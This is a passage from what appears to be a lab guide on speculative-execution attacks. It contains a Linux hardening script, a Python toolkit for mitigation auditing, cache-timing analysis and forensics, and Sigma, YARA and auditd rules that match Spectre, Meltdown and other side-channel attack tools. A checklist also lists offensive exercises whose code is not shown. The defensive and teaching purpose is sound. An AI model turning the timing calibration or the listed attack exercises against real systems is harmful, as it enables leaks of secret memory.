BACKUP_DIR="/root/spectre-hardening-backup-$(date +%Y%m%d)"
mkdir -p "$BACKUP_DIR"

echo "=== Speculative Execution Hardening Deployment ==="
echo "Backup directory: $BACKUP_DIR"
echo ""

# Backup current GRUB config
cp /etc/default/grub "$BACKUP_DIR/grub.backup"

# === GRUB PARAMETERS ===
echo "[1/5] Configuring boot parameters..."

HARDENING_PARAMS="spectre_v1=on spectre_v2=on spec_store_bypass_disable=on"
HARDENING_PARAMS+=" spectre_bhi=on l1tf=flush,nosmt mds=full tsx=off"
HARDENING_PARAMS+=" kvm.nx_huge_pages=force mitigations=auto,nosmt"
HARDENING_PARAMS+=" pti=on retbleed=auto srbds=on mmio_stale_data=full"
HARDENING_PARAMS+=" gather_data_sampling=force"

# Add to GRUB if not present
if ! grep -q "spectre_v2=on" /etc/default/grub; then
    sed -i "s/GRUB_CMDLINE_LINUX=\"\(.*\)\"/GRUB_CMDLINE_LINUX=\"\1 $HARDENING_PARAMS\"/" \
        /etc/default/grub
    echo "  [+] Boot parameters added to GRUB"
else
    echo "  [=] Boot parameters already configured"
fi

# === SYSCTL SETTINGS ===
echo "[2/5] Applying sysctl hardening..."

cat > /etc/sysctl.d/99-spectre-hardening.conf << 'EOF'
# Speculative execution hardening
kernel.unprivileged_bpf_disabled = 2
kernel.kptr_restrict = 2
kernel.dmesg_restrict = 1
kernel.perf_event_paranoid = 3
vm.unprivileged_userfaultfd = 0
kernel.yama.ptrace_scope = 2
EOF

sysctl -p /etc/sysctl.d/99-spectre-hardening.conf 2>/dev/null || true
echo "  [+] Sysctl parameters applied"

# === RUNTIME CHECKS ===
echo "[3/5] Verifying runtime state..."

# Disable TSX at runtime if possible
if [ -f /sys/devices/system/cpu/vulnerabilities/tsx_async_abort ]; then
    echo "  TSX status: $(cat /sys/devices/system/cpu/vulnerabilities/tsx_async_abort)"
fi

# Core scheduling
if [ -f /proc/sys/kernel/sched_core_enabled ]; then
    echo 1 > /proc/sys/kernel/sched_core_enabled 2>/dev/null || true
    echo "  [+] Core scheduling enabled"
fi

# === MICROCODE CHECK ===
echo "[4/5] Checking microcode currency..."

VENDOR=$(grep -m1 'vendor_id' /proc/cpuinfo | awk '{print $NF}')
UCODE=$(grep -m1 'microcode' /proc/cpuinfo | awk -F: '{print $2}' | xargs)
echo "  Vendor: $VENDOR"
echo "  Current microcode: $UCODE"

if [ "$VENDOR" = "GenuineIntel" ]; then
    if dpkg -l intel-microcode &>/dev/null; then
        echo "  [+] intel-microcode package installed"
    else
        echo "  [!] intel-microcode package NOT installed — install it:"
        echo "      apt install intel-microcode"
    fi
elif [ "$VENDOR" = "AuthenticAMD" ]; then
    if dpkg -l amd64-microcode &>/dev/null; then
        echo "  [+] amd64-microcode package installed"
    else
        echo "  [!] amd64-microcode package NOT installed — install it:"
        echo "      apt install amd64-microcode"
    fi
fi

# === VERIFICATION ===
echo "[5/5] Post-hardening verification..."
echo ""

echo "  Vulnerability status:"
for f in /sys/devices/system/cpu/vulnerabilities/*; do
    status=$(cat "$f")
    name=$(basename "$f")
    if echo "$status" | grep -qi "vulnerable"; then
        printf "    \033[31m%-35s %s\033[0m\n" "$name" "$status"
    else
        printf "    \033[32m%-35s %s\033[0m\n" "$name" "$status"
    fi
done

echo ""
echo "  Key sysctl values:"
printf "    %-45s = %s\n" "kernel.unprivileged_bpf_disabled" \
    "$(cat /proc/sys/kernel/unprivileged_bpf_disabled 2>/dev/null || echo N/A)"
printf "    %-45s = %s\n" "kernel.kptr_restrict" \
    "$(cat /proc/sys/kernel/kptr_restrict 2>/dev/null || echo N/A)"
printf "    %-45s = %s\n" "kernel.perf_event_paranoid" \
    "$(cat /proc/sys/kernel/perf_event_paranoid 2>/dev/null || echo N/A)"

echo ""
echo "=== Hardening Complete ==="
echo "NOTE: Reboot required for boot parameter changes to take effect."
echo "Run: update-grub && reboot"
```

---

## PART C: FRAMEWORK DEVELOPMENT

### Spectre & Side-Channel Analysis Toolkit

```python
#!/usr/bin/env python3
"""
spectre_analysis_toolkit.py — Comprehensive Spectre/Side-Channel Analysis Framework

Modules:
  - MitigationAuditor: Verify all speculative execution mitigations
  - TimingAnalyzer: Statistical analysis of cache timing measurements
  - PerformanceImpact: Measure mitigation overhead
  - ForensicTimeline: Reconstruct microarchitectural attack evidence
  - DetectionRuleGenerator: Generate Sigma/YARA rules for side-channel indicators
  - FleetScanner: Audit heterogeneous CPU fleets for mitigation gaps

Usage:
  python3 spectre_analysis_toolkit.py audit
  python3 spectre_analysis_toolkit.py timing <data_file>
  python3 spectre_analysis_toolkit.py impact <benchmark_cmd>
  python3 spectre_analysis_toolkit.py forensics <perf_data>
  python3 spectre_analysis_toolkit.py generate-rules
  python3 spectre_analysis_toolkit.py fleet-scan
"""

import subprocess
import os
import sys
import json
import re
import time
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Tuple
from pathlib import Path
from datetime import datetime, timezone


@dataclass
class VulnerabilityStatus:
    name: str
    status: str
    severity: str  # CRITICAL, HIGH, OK, N/A
    mitigation: str
    recommendation: str = ""


@dataclass
class CPUInfo:
    vendor: str
    family: int
    model: int
    stepping: int
    model_name: str
    microcode: str
    flags: List[str] = field(default_factory=list)


class MitigationAuditor:
    """Audit all speculative execution mitigations on the current system."""

    VULN_DIR = Path("/sys/devices/system/cpu/vulnerabilities")

    CRITICAL_VULNS = {
        "spectre_v1", "spectre_v2", "meltdown",
        "spec_store_bypass", "retbleed", "spec_rstack_overflow",
        "gather_data_sampling"
    }

    def __init__(self):
        self.cpu_info = self._get_cpu_info()
        self.vulnerabilities: List[VulnerabilityStatus] = []
        self.boot_params = self._get_boot_params()

    def _get_cpu_info(self) -> CPUInfo:
        info = {"vendor": "", "family": 0, "model": 0, "stepping": 0,
                "model_name": "", "microcode": "", "flags": []}
        try:
            with open("/proc/cpuinfo") as f:
                for line in f:
                    if ":" not in line:
                        continue
                    key, val = line.split(":", 1)
                    key, val = key.strip(), val.strip()
                    if key == "vendor_id":
                        info["vendor"] = val
                    elif key == "cpu family":
                        info["family"] = int(val)
                    elif key == "model" and "name" not in key:
                        info["model"] = int(val)
                    elif key == "stepping":
                        info["stepping"] = int(val)
                    elif key == "model name":
                        info["model_name"] = val
                    elif key == "microcode":
                        info["microcode"] = val
                    elif key == "flags":
                        info["flags"] = val.split()
                    if info["flags"]:
                        break
        except IOError:
            pass
        return CPUInfo(**info)

    def _get_boot_params(self) -> str:
        try:
            with open("/proc/cmdline") as f:
                return f.read().strip()
        except IOError:
            return ""

    def audit(self) -> List[VulnerabilityStatus]:
        """Run complete mitigation audit."""
        self.vulnerabilities = []

        if not self.VULN_DIR.exists():
            return self.vulnerabilities

        for vuln_file in sorted(self.VULN_DIR.iterdir()):
            name = vuln_file.name
            try:
                status = vuln_file.read_text().strip()
            except IOError:
                status = "unreadable"

            severity = self._classify_severity(name, status)
            mitigation = self._extract_mitigation(status)
            recommendation = self._get_recommendation(name, status)

            self.vulnerabilities.append(VulnerabilityStatus(
                name=name,
                status=status,
                severity=severity,
                mitigation=mitigation,
                recommendation=recommendation
            ))

        # Additional checks not in sysfs
        self._check_bpf_status()
        self._check_tsx_status()
        self._check_smt_status()

        return self.vulnerabilities

    def _classify_severity(self, name: str, status: str) -> str:
        if "vulnerable" in status.lower():
            return "CRITICAL" if name in self.CRITICAL_VULNS else "HIGH"
        elif "not affected" in status.lower():
            return "N/A"
        elif "mitigation" in status.lower():
            return "OK"
        return "HIGH"

    def _extract_mitigation(self, status: str) -> str:
        if "Mitigation:" in status:
            return status.split("Mitigation:")[1].strip()
        return status

    def _get_recommendation(self, name: str, status: str) -> str:
        if "vulnerable" not in status.lower():
            return ""

        recommendations = {
            "spectre_v1": "Apply kernel patches with array_index_nospec",
            "spectre_v2": "Enable eIBRS (microcode) or retpoline (kernel)",
            "meltdown": "Enable KPTI (pti=on) or update to non-vulnerable CPU",
            "spec_store_bypass": "Enable SSBD (spec_store_bypass_disable=on)",
            "retbleed": "Apply retbleed=auto or retbleed=ibpb",
            "spec_rstack_overflow": "Apply spec_rstack_overflow=safe-ret",
            "gather_data_sampling": "Update microcode for GDS mitigation",
        }
        return recommendations.get(name, "Update microcode and kernel")

    def _check_bpf_status(self):
        try:
            with open("/proc/sys/kernel/unprivileged_bpf_disabled") as f:
                val = int(f.read().strip())
            if val == 0:
                self.vulnerabilities.append(VulnerabilityStatus(
                    name="unprivileged_bpf",
                    status="Enabled (value=0)",
                    severity="HIGH",
                    mitigation="None",
                    recommendation="Set kernel.unprivileged_bpf_disabled=1"
                ))
        except (IOError, ValueError):
            pass

    def _check_tsx_status(self):
        if "rtm" in self.cpu_info.flags:
            self.vulnerabilities.append(VulnerabilityStatus(
                name="tsx_enabled",
                status="TSX (RTM) available in CPU flags",
                severity="HIGH",
                mitigation="None",
                recommendation="Boot with tsx=off to disable TSX"
            ))

    def _check_smt_status(self):
        try:
            with open("/sys/devices/system/cpu/smt/active") as f:
                active = f.read().strip()
            if active == "1":
                self.vulnerabilities.append(VulnerabilityStatus(
                    name="smt_active",
                    status="SMT/HyperThreading enabled",
                    severity="HIGH" if self.cpu_info.vendor == "GenuineIntel" else "MEDIUM",
                    mitigation="Active (TLBleed/port contention possible)",
                    recommendation="Consider nosmt or core scheduling for sensitive workloads"
                ))
        except IOError:
            pass

    def report(self) -> str:
        """Generate human-readable audit report."""
        lines = [
            "=" * 70,
            "SPECULATIVE EXECUTION MITIGATION AUDIT REPORT",
            "=" * 70,
            f"Date:      {datetime.now(timezone.utc).isoformat()}",
            f"CPU:       {self.cpu_info.model_name}",
            f"Vendor:    {self.cpu_info.vendor}",
            f"Microcode: {self.cpu_info.microcode}",
            f"Boot:      {self.boot_params[:80]}...",
            "",
            "-" * 70,
        ]

        counts = {"CRITICAL": 0, "HIGH": 0, "OK": 0, "N/A": 0}

        for v in self.vulnerabilities:
            counts[v.severity] = counts.get(v.severity, 0) + 1
            marker = {"CRITICAL": "!!!", "HIGH": "! ", "OK": "  ", "N/A": "  "}
            lines.append(f"  {marker.get(v.severity, '  ')}[{v.severity:8s}] "
                        f"{v.name:35s} {v.mitigation[:40]}")
            if v.recommendation:
                lines.append(f"             → {v.recommendation}")

        lines.extend([
            "",
            "-" * 70,
            f"Summary: CRITICAL={counts['CRITICAL']} HIGH={counts['HIGH']} "
            f"OK={counts['OK']} N/A={counts['N/A']}",
            "=" * 70,
        ])

        return "\n".join(lines)


class TimingAnalyzer:
    """Statistical analysis of cache timing measurements."""

    def __init__(self, data: List[int]):
        self.data = sorted(data)
        self.n = len(data)

    @property
    def mean(self) -> float:
        return sum(self.data) / self.n if self.n else 0

    @property
    def median(self) -> float:
        if self.n == 0:
            return 0
        mid = self.n // 2
        return (self.data[mid] + self.data[mid - 1]) / 2 if self.n % 2 == 0 else self.data[mid]

    @property
    def stddev(self) -> float:
        if self.n < 2:
            return 0
        m = self.mean
        return (sum((x - m) ** 2 for x in self.data) / (self.n - 1)) ** 0.5

    def percentile(self, p: float) -> float:
        idx = int(self.n * p / 100)
        return self.data[min(idx, self.n - 1)]

    def is_bimodal(self, gap_threshold: float = 2.0) -> Tuple[bool, float, float]:
        """Detect bimodal distribution (cache hit vs miss)."""
        if self.n < 20:
            return False, 0, 0

        # Simple peak detection: find gap > threshold * stddev
        diffs = [self.data[i+1] - self.data[i] for i in range(self.n - 1)]
        max_gap_idx = max(range(len(diffs)), key=lambda i: diffs[i])
        max_gap = diffs[max_gap_idx]

        if max_gap > gap_threshold * self.stddev:
            low_cluster = self.data[:max_gap_idx + 1]
            high_cluster = self.data[max_gap_idx + 1:]
            low_mean = sum(low_cluster) / len(low_cluster)
            high_mean = sum(high_cluster) / len(high_cluster)
            return True, low_mean, high_mean

        return False, 0, 0

    def optimal_threshold(self) -> int:
        """Calculate optimal cache hit/miss threshold."""
        bimodal, low, high = self.is_bimodal()
        if bimodal:
            return int((low + high) / 2)
        return int(self.percentile(50))

    def report(self) -> str:
        bimodal, low, high = self.is_bimodal()
        lines = [
            f"Timing Analysis (n={self.n})",
            f"  Mean:   {self.mean:.1f} cycles",
            f"  Median: {self.median:.1f} cycles",
            f"  StdDev: {self.stddev:.1f} cycles",
            f"  P5:     {self.percentile(5):.0f} cycles",
            f"  P95:    {self.percentile(95):.0f} cycles",
            f"  Bimodal: {'Yes' if bimodal else 'No'}",
        ]
        if bimodal:
            lines.append(f"  Cluster 1 (hits): ~{low:.0f} cycles")
            lines.append(f"  Cluster 2 (misses): ~{high:.0f} cycles")
            lines.append(f"  Optimal threshold: {self.optimal_threshold()} cycles")
        return "\n".join(lines)


class DetectionRuleGenerator:
    """Generate detection rules for speculative execution attacks."""

    def generate_sigma_rules(self) -> List[Dict]:
        """Generate Sigma rules for side-channel attack indicators."""
        rules = []

        # Rule 1: High-frequency rdtsc/timing measurements
        rules.append({
            "title": "High-Frequency Cache Timing Measurement",
            "id": "spectre-lab-001",
            "status": "experimental",
            "description": "Detects processes performing high-frequency "
                          "cache timing measurements (Flush+Reload indicator)",
            "logsource": {"category": "process_creation", "product": "linux"},
            "detection": {
                "selection": {"Image|endswith": ["/spectre", "/flush_reload",
                                                  "/prime_probe", "/meltdown"]},
                "condition": "selection"
            },
            "level": "high",
            "tags": ["attack.credential_access", "attack.t1003",
                    "cve.2017.5753", "cve.2017.5715"]
        })

        # Rule 2: Unprivileged BPF program load
        rules.append({
            "title": "Unprivileged eBPF Program Load Attempt",
            "id": "spectre-lab-002",
            "status": "experimental",
            "description": "Non-root BPF_PROG_LOAD — potential speculative "
                          "kernel memory access vector",
            "logsource": {"category": "process_creation", "product": "linux"},
            "detection": {
                "selection": {"Syscall": "bpf", "User|not": "root"},
                "condition": "selection"
            },
            "level": "critical",
            "tags": ["attack.privilege_escalation", "attack.t1068"]
        })

        # Rule 3: perf_event_open burst
        rules.append({
            "title": "Performance Counter Access Burst",
            "id": "spectre-lab-003",
            "status": "experimental",
            "description": "Process opens multiple performance counters "
                          "rapidly — cache attack instrumentation indicator",
            "logsource": {"category": "syscall", "product": "linux"},
            "detection": {
                "selection": {"Syscall": "perf_event_open"},
                "timeframe": "10s",
                "condition": "selection | count() > 10"
            },
            "level": "high",
            "tags": ["attack.collection", "attack.t1005"]
        })

        return rules

    def generate_yara_rules(self) -> str:
        """Generate YARA rules for Spectre/side-channel PoC detection."""
        return '''
rule Spectre_V1_Binary {
    meta:
        description = "Compiled Spectre v1 PoC — clflush+rdtscp+probe pattern"
        severity = "high"
    strings:
        $clflush = { 0F AE (38|39|3A|3B|3C|3D|3E|3F) }
        $rdtscp  = { 0F 01 F9 }
        $mfence  = { 0F AE F0 }
        $s1 = "CACHE_HIT_THRESHOLD" ascii
        $s2 = "probe" ascii
        $s3 = "spectre" ascii nocase
    condition:
        uint32(0) == 0x464C457F and #rdtscp >= 2 and
        #clflush >= 1 and $mfence and 1 of ($s*)
}

rule Cache_Covert_Channel {
    meta:
        description = "Cache covert channel implementation"
        severity = "high"
    strings:
        $clflush = { 0F AE (38|39|3A|3B|3C|3D|3E|3F) }
        $rdtscp  = { 0F 01 F9 }
        $shm1    = "shm_open" ascii
        $shm2    = "MAP_SHARED" ascii
        $s1      = "covert" ascii nocase
        $s2      = "channel" ascii nocase
        $s3      = "send" ascii
        $s4      = "recv" ascii
    condition:
        uint32(0) == 0x464C457F and $clflush and $rdtscp and
        ($shm1 or $shm2) and 2 of ($s*)
}

rule Prime_Probe_Tool {
    meta:
        description = "Prime+Probe LLC attack tool"
        severity = "high"
    strings:
        $rdtscp   = { 0F 01 F9 }
        $s1       = "eviction" ascii nocase
        $s2       = "prime" ascii nocase
        $s3       = "probe" ascii nocase
        $s4       = "LLC" ascii
        $s5       = "cache set" ascii nocase
    condition:
        uint32(0) == 0x464C457F and $rdtscp and 3 of ($s*)
}

rule Meltdown_Binary {
    meta:
        description = "Meltdown PoC binary"
        severity = "critical"
    strings:
        $rdtscp  = { 0F 01 F9 }
        $clflush = { 0F AE (38|39|3A|3B|3C|3D|3E|3F) }
        $s1      = "meltdown" ascii nocase
        $s2      = "kernel" ascii
        $s3      = "0xffffffff" ascii
        $s4      = "SIGSEGV" ascii
        $s5      = "longjmp" ascii
    condition:
        uint32(0) == 0x464C457F and $rdtscp and $clflush and 2 of ($s*)
}

rule Retbleed_PoC {
    meta:
        description = "Retbleed exploitation tool"
        severity = "critical"
    strings:
        $ret_slide = { C3 C3 C3 C3 C3 C3 C3 C3 }
        $rdtscp    = { 0F 01 F9 }
        $s1        = "retbleed" ascii nocase
        $s2        = "rsb" ascii nocase
        $s3        = "underflow" ascii nocase
    condition:
        uint32(0) == 0x464C457F and $ret_slide and $rdtscp and 1 of ($s*)
}

rule GDS_Downfall_PoC {
    meta:
        description = "GDS/Downfall gather-based side channel"
        severity = "critical"
    strings:
        $vpgather = { C4 (E2|62) .. (90|91|92|93) }
        $rdtscp   = { 0F 01 F9 }
        $s1       = "gather" ascii nocase
        $s2       = "downfall" ascii nocase
        $s3       = "GDS" ascii
    condition:
        uint32(0) == 0x464C457F and ($vpgather or $s1) and $rdtscp and 1 of ($s*)
}

rule Zenbleed_PoC {
    meta:
        description = "Zenbleed register leak exploitation"
        severity = "critical"
    strings:
        $vzeroupper = { C5 F8 77 }
        $s1         = "zenbleed" ascii nocase
        $s2         = "vzeroupper" ascii nocase
        $s3         = "DE_CFG" ascii
        $s4         = "0xC0011029" ascii
    condition:
        uint32(0) == 0x464C457F and $vzeroupper and 1 of ($s*)
}
'''

    def generate_auditd_rules(self) -> str:
        """Generate auditd rules for side-channel attack detection."""
        return '''# Side-channel attack detection — auditd rules
# Deploy to: /etc/audit/rules.d/spectre-detection.rules

# Monitor perf_event_open (timing measurement setup)
-a always,exit -F arch=b64 -S perf_event_open -F uid>=1000 -k spectre_timing

# Monitor BPF syscall (speculative bypass vector)
-a always,exit -F arch=b64 -S bpf -F uid>=1000 -k spectre_bpf

# Monitor prctl with speculation control
-a always,exit -F arch=b64 -S prctl -F a0=53 -k spectre_prctl
-a always,exit -F arch=b64 -S prctl -F a0=54 -k spectre_prctl

# Monitor mmap with MAP_SHARED (Flush+Reload prerequisite)
-a always,exit -F arch=b64 -S mmap -F a3&0x01 -F uid>=1000 -k spectre_mmap

# Monitor access to vulnerability status (reconnaissance)
-w /sys/devices/system/cpu/vulnerabilities/ -p r -k spectre_recon

# Monitor MSR access (microcode/mitigation manipulation)
-w /dev/cpu/ -p rw -k spectre_msr
'''

    def write_all(self, output_dir: str):
        """Write all detection rules to files."""
        os.makedirs(output_dir, exist_ok=True)

        # Sigma rules
        sigma_path = os.path.join(output_dir, "sigma_spectre_rules.json")
        with open(sigma_path, 'w') as f:
            json.dump(self.generate_sigma_rules(), f, indent=2)
        print(f"  [+] Sigma rules: {sigma_path}")

        # YARA rules
        yara_path = os.path.join(output_dir, "spectre_detection.yar")
        with open(yara_path, 'w') as f:
            f.write(self.generate_yara_rules())
        print(f"  [+] YARA rules: {yara_path}")

        # Auditd rules
        audit_path = os.path.join(output_dir, "spectre-detection.rules")
        with open(audit_path, 'w') as f:
            f.write(self.generate_auditd_rules())
        print(f"  [+] Auditd rules: {audit_path}")


class ForensicTimeline:
    """Construct forensic timeline from performance counter data."""

    @dataclass
    class Event:
        timestamp: float
        event_type: str
        pid: int
        comm: str
        details: str
        severity: str = "INFO"

    def __init__(self):
        self.events: List[ForensicTimeline.Event] = []

    def parse_perf_script(self, perf_output: str):
        """Parse perf script output into timeline events."""
        for line in perf_output.split('\n'):
            if not line.strip():
                continue
            # Format: comm pid [cpu] timestamp: event_name: ...
            match = re.match(
                r'\s*(\S+)\s+(\d+)\s+\[(\d+)\]\s+([\d.]+):\s+(\S+):\s*(.*)',
                line
            )
            if match:
                comm, pid, cpu, ts, event, details = match.groups()
                self.events.append(self.Event(
                    timestamp=float(ts),
                    event_type=event,
                    pid=int(pid),
                    comm=comm,
                    details=details.strip()
                ))

    def detect_anomalies(self, window_sec: float = 1.0) -> List[Event]:
        """Detect anomalous event clusters."""
        if not self.events:
            return []

        anomalies = []
        self.events.sort(key=lambda e: e.timestamp)

        # Sliding window: count events per PID
        for i, event in enumerate(self.events):
            window_events = [
                e for e in self.events
                if abs(e.timestamp - event.timestamp) <= window_sec
                and e.pid == event.pid
            ]
            if len(window_events) > 50:  # threshold for anomaly
                anomaly = self.Event(
                    timestamp=event.timestamp,
                    event_type="ANOMALY_CLUSTER",
                    pid=event.pid,
                    comm=event.comm,
                    details=f"{len(window_events)} events in {window_sec}s window",
                    severity="HIGH"
                )
                if not any(a.pid == anomaly.pid and
                          abs(a.timestamp - anomaly.timestamp) < window_sec
                          for a in anomalies):
                    anomalies.append(anomaly)

        return anomalies

    def generate_report(self) -> str:
        """Generate forensic timeline report."""
        anomalies = self.detect_anomalies()
        lines = [
            "MICROARCHITECTURAL ATTACK FORENSIC TIMELINE",
            "=" * 60,
            f"Total events: {len(self.events)}",
            f"Time span: {self.events[-1].timestamp - self.events[0].timestamp:.3f}s"
            if self.events else "No events",
            f"Anomalies detected: {len(anomalies)}",
            "",
        ]

        if anomalies:
            lines.append("ANOMALIES:")
            for a in anomalies:
                lines.append(f"  [{a.severity}] t={a.timestamp:.6f} "
                           f"pid={a.pid} ({a.comm}): {a.details}")
            lines.append("")

        # Top PIDs by event count
        pid_counts: Dict[int, int] = {}
        for e in self.events:
            pid_counts[e.pid] = pid_counts.get(e.pid, 0) + 1

        lines.append("TOP PROCESSES BY EVENT COUNT:")
        for pid, count in sorted(pid_counts.items(), key=lambda x: -x[1])[:10]:
            comm = next((e.comm for e in self.events if e.pid == pid), "?")
            lines.append(f"  PID {pid:6d} ({comm:16s}): {count:6d} events")

        return "\n".join(lines)


class PerformanceImpact:
    """Measure mitigation performance overhead."""

    def measure(self, benchmark_cmd: str, iterations: int = 5) -> Dict:
        """Run benchmark and collect performance metrics."""
        perf_events = "instructions,cycles,cache-misses,cache-references," \
                     "branch-misses,branches,task-clock"

        cmd = f"perf stat -e {perf_events} -r {iterations} -- {benchmark_cmd}"

        try:
            result = subprocess.run(
                cmd.split(), capture_output=True, text=True, timeout=300
            )
            return self._parse_perf_stat(result.stderr)
        except (subprocess.TimeoutExpired, FileNotFoundError) as e:
            return {"error": str(e)}

    def _parse_perf_stat(self, output: str) -> Dict:
        metrics = {}
        for line in output.split('\n'):
            match = re.match(r'\s*([\d,]+)\s+(\S+)', line)
            if match:
                value = int(match.group(1).replace(',', ''))
                name = match.group(2)
                metrics[name] = value
        return metrics

    def compare(self, baseline: Dict, mitigated: Dict) -> str:
        """Compare baseline vs mitigated performance."""
        lines = [
            "MITIGATION PERFORMANCE IMPACT",
            "=" * 60,
            f"{'Metric':<30} {'Baseline':>12} {'Mitigated':>12} {'Overhead':>10}",
            "-" * 60,
        ]

        for key in baseline:
            if key in mitigated and baseline[key] > 0:
                overhead = ((mitigated[key] - baseline[key]) / baseline[key]) * 100
                lines.append(
                    f"{key:<30} {baseline[key]:>12,} {mitigated[key]:>12,} "
                    f"{overhead:>+9.1f}%"
                )

        return "\n".join(lines)


def main():
    if len(sys.argv) < 2:
        print(__doc__)
        sys.exit(1)

    command = sys.argv[1]

    if command == "audit":
        auditor = MitigationAuditor()
        auditor.audit()
        print(auditor.report())

    elif command == "generate-rules":
        generator = DetectionRuleGenerator()
        output_dir = sys.argv[2] if len(sys.argv) > 2 else "/opt/spectre-detect"
        print(f"Generating detection rules in {output_dir}...")
        generator.write_all(output_dir)
        print("\nDone. Deploy rules to your SIEM/EDR platform.")

    elif command == "timing":
        if len(sys.argv) < 3:
            print("Usage: spectre_analysis_toolkit.py timing <data_file>")
            print("  Data file: one timing measurement (cycles) per line")
            sys.exit(1)
        with open(sys.argv[2]) as f:
            data = [int(line.strip()) for line in f if line.strip().isdigit()]
        analyzer = TimingAnalyzer(data)
        print(analyzer.report())

    elif command == "impact":
        if len(sys.argv) < 3:
            print("Usage: spectre_analysis_toolkit.py impact <benchmark_cmd>")
            sys.exit(1)
        benchmark = " ".join(sys.argv[2:])
        impact = PerformanceImpact()
        print(f"Running benchmark: {benchmark}")
        metrics = impact.measure(benchmark)
        print(json.dumps(metrics, indent=2))

    elif command == "forensics":
        timeline = ForensicTimeline()
        if len(sys.argv) > 2:
            # Read perf script output from file
            with open(sys.argv[2]) as f:
                timeline.parse_perf_script(f.read())
        else:
            # Read from stdin
            timeline.parse_perf_script(sys.stdin.read())
        print(timeline.generate_report())

    elif command == "fleet-scan":
        # Run audit and output machine-parseable JSON
        auditor = MitigationAuditor()
        auditor.audit()
        result = {
            "hostname": os.uname().nodename,
            "cpu": auditor.cpu_info.model_name,
            "vendor": auditor.cpu_info.vendor,
            "microcode": auditor.cpu_info.microcode,
            "vulnerabilities": [
                {"name": v.name, "severity": v.severity,
                 "status": v.status, "recommendation": v.recommendation}
                for v in auditor.vulnerabilities
            ],
            "critical_count": sum(1 for v in auditor.vulnerabilities
                                  if v.severity == "CRITICAL"),
            "timestamp": datetime.now(timezone.utc).isoformat()
        }
        print(json.dumps(result, indent=2))

    else:
        print(f"Unknown command: {command}")
        print(__doc__)
        sys.exit(1)


if __name__ == "__main__":
    main()
```

**Usage examples:**

```bash
# Full audit
sudo python3 spectre_analysis_toolkit.py audit

# Generate detection rules
sudo python3 spectre_analysis_toolkit.py generate-rules /opt/spectre-detect/

# Analyze timing data from Flush+Reload measurements
python3 spectre_analysis_toolkit.py timing timing_data.txt

# Measure mitigation performance impact
sudo python3 spectre_analysis_toolkit.py impact "dd if=/dev/zero of=/dev/null bs=4k count=100000"

# Forensic analysis of perf recording
perf script -i perf.data > perf_events.txt
python3 spectre_analysis_toolkit.py forensics perf_events.txt

# Fleet-wide scan (pipe to central collector)
sudo python3 spectre_analysis_toolkit.py fleet-scan | \
    curl -X POST -H "Content-Type: application/json" -d @- https://siem.internal/api/spectre-audit
```

---

## Lab Validation Checklist

### Part A — Offensive

- [ ] **Ex1**: Spectre v1 PoC recovers >90% of secret bytes on unmitigated system
- [ ] **Ex1**: Auto-calibration produces valid hit/miss threshold
- [ ] **Ex2**: FLUSH+RELOAD detects shared-library access from another process
- [ ] **Ex3**: Eviction set construction finds LLC_WAYS members
- [ ] **Ex3**: PRIME+PROBE distinguishes victim access from no-access
- [ ] **Ex4**: Covert channel transmits message correctly between processes
- [ ] **Ex5**: BTB poisoning redirects speculative execution to gadget
- [ ] **Ex6**: Meltdown reads kernel bytes (on vulnerable+unmitigated Intel)
- [ ] **Ex7**: Prefetch timing distinguishes mapped from unmapped addresses
- [ ] **Ex8**: Understand eBPF speculative bypass mechanism and mitigations

### Part B — Defensive

- [ ] **Ex9**: Audit script correctly identifies all vulnerability states
- [ ] **Ex9**: Recommendations are specific to detected gaps
- [ ] **Ex10**: eBPF/bpftrace monitor detects Spectre PoC execution
- [ ] **Ex10**: Performance counter anomalies trigger alerts
- [ ] **Ex11**: Hardening script applies boot parameters and sysctls
- [ ] **Ex11**: Post-hardening verification shows all mitigations active

### Part C — Framework

- [ ] MitigationAuditor correctly classifies all sysfs vulnerability entries
- [ ] TimingAnalyzer detects bimodal distribution and calculates threshold
- [ ] DetectionRuleGenerator produces valid Sigma/YARA/auditd rules
- [ ] ForensicTimeline identifies event clusters as anomalies
- [ ] Fleet-scan produces JSON suitable for central aggregation

---

## Appendix A: Attack Technique Summary

| Attack | CVE | Target | Prerequisite | Mitigation | Detection |
|--------|-----|--------|--------------|------------|-----------|
| Spectre v1 | CVE-2017-5753 | PHT | Gadget in victim | array_index_nospec, lfence | Cache miss rate anomaly |
| Spectre v2 | CVE-2017-5715 | BTB | Address aliasing | Retpoline, eIBRS, IBPB | Branch misprediction spike |
| Meltdown | CVE-2017-5754 | Permission check | Intel pre-Ice Lake | KPTI | N/A (hardware fix) |
| Spectre v4 | CVE-2018-3639 | Store buffer | Store/load aliasing | SSBD | Difficult (normal code pattern) |
| Spectre-BHB | CVE-2022-23960 | BHB→BTB | eIBRS bypass | BHI_DIS_S, BHB clear | BACLEARS spike |
| Retbleed | CVE-2022-29900/01 | RSB→BTB | RSB underflow | Untrain-ret, IBPB | ret instruction frequency |
| GDS/Downfall | CVE-2022-40982 | Gather buffer | AVX gather + co-tenant | Microcode | AVX + timing co-occurrence |
| Inception | CVE-2023-20569 | RSB | Phantom call (Zen 3/4) | Safe-RET, IBPB | RSB manipulation pattern |
| Zenbleed | CVE-2023-20593 | Register file | VZEROUPPER + rollback | Microcode, DE_CFG[9] | Direct (no side channel) |
| Native BHI | CVE-2024-2201 | BHB→BTB | Native gadgets | BHI_DIS_S | Same as BHB |

## Appendix B: CPU Vulnerability Matrix

| CPU Family | Meltdown | Spectre v1/v2 | L1TF | MDS | Retbleed | GDS | SRSO | Zenbleed |
|-----------|----------|---------------|------|-----|----------|-----|------|----------|
| Intel Skylake (6th) | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | — | — |
| Intel Coffee Lake (8th) | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | — | — |
| Intel Ice Lake (10th) | — | ✓ | — | — | — | ✓ | — | — |
| Intel Alder Lake (12th) | — | ✓ | — | — | — | — | — | — |
| AMD Zen 1 | — | ✓ | — | — | ✓ | — | — | — |
| AMD Zen 2 | — | ✓ | — | — | ✓ | — | — | ✓ |
| AMD Zen 3 | — | ✓ | — | — | — | — | ✓ | — |
| AMD Zen 4 | — | ✓ | — | — | — | — | ✓ | — |
| ARM Cortex-A75 | ✓ | ✓ | — | — | — | — | — | — |
| ARM Cortex-A76+ | — | ✓ | — | — | — | — | — | — |

## Appendix C: Performance Impact Reference

| Mitigation | Syscall-heavy | Compute-heavy | I/O-heavy | AVX-heavy |
|-----------|---------------|---------------|-----------|-----------|
| KPTI (with PCID) | 5-12% | <1% | 3-7% | <1% |
